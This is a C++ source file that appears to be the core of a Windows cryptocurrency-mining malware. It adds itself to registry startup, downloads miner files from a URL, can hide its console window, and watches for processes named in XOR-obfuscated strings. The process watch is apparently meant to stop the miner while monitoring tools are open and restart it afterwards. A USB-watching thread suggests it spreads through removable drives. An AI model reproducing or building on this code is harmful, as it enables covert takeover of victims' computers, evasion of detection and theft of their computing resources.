#include "constants.h"

//############### OPTIONS ################//
int	on_test			=	0;
int console_window		=	1;
//############### OPTIONS ################//



void testing_area() {}

void Watcher_Thread() {
	while (true) {Sleep(1000);
		if (proc_handler.IsProccessExists(XOR(hex_to_string("744F2C414D492D0445563A")).c_str()) == 1 || proc_handler.IsProccessExists(XOR(hex_to_string("504B2D4C4D41310445563A")).c_str()) == 1 || proc_handler.IsProccessExists(XOR(hex_to_string("705C3049455D2C62414D344F52003A5245")).c_str()) == 1) {
			if (proc_handler.IsProccessExists(miner_name)) {
				cout << "[-] Thread deteced ! stop mining\n";
				proc_handler.KillProccessByName(miner_name);
			}
		}
		else {
			if (proc_handler.IsProccessExists(miner_name) == 0) {
				cout << "[-] Start mining\n";
				system(miner_background.c_str());
			}
		}
	}
}


int	safe_main() {
	if (on_test == 1) {
		testing_area();
		return 0;
	}
	reg_handler.AddToStartup(regKey_name, execu_path.c_str());
	while (file_handler.init_files(InstallPath, url, miner_name) == 0){ 
		
		Sleep(1000);  //retry to download files every 10s 
	}
	cout << "[*] In Safe main\n";
	thread watcher(Watcher_Thread);
	thread usb_watcher(&USB_HANDLER::FindUsbDevices, &usb_handler);
	usb_watcher.join();
	cout << "[-] Usb watcher Thread started\n";
	watcher.join();
	cout << "[-] Watcher Thread started\n";
	return 0;
}

int	main() {
	if (console_window	 == 0) {
		ShowWindow(GetConsoleWindow(), SW_HIDE);
	}
	if (file_handler.safe_move(InstallPath.c_str() , exec_name , lock_name) == 1) {
		cout << "[-] Calling safe main\n";
		safe_main();
	}
	return 0;
}
